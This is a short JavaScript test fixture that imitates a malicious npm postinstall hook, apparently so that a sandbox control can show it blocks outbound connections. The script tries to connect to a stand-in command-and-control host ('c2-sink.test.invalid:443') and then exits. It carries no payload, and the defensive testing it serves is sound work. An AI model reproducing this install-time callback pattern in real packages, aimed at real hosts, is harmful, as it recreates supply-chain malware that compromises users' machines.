// Synthetic supply-chain attack shape — reproduces postinstall->network-egress
// without containing any real malicious bytes. Sentinel VAL-01 asserts that
// the connection attempt below is intercepted and denied.
'use strict';
var net = require('net');
process.stdout.write('ua-parser-js-mock: attempting connect to c2-sink.test.invalid:443\n');
var sock = net.createConnection({ host: 'c2-sink.test.invalid', port: 443 });
var done = false;
function finish() {
  if (done) return;
  done = true;
  try { sock.destroy(); } catch (_) {}
  process.exit(0);
}
sock.on('error', finish);   // Sentinel may EHOSTUNREACH us.
sock.on('connect', finish); // A leak should not hang npm forever.
setTimeout(finish, 1000);
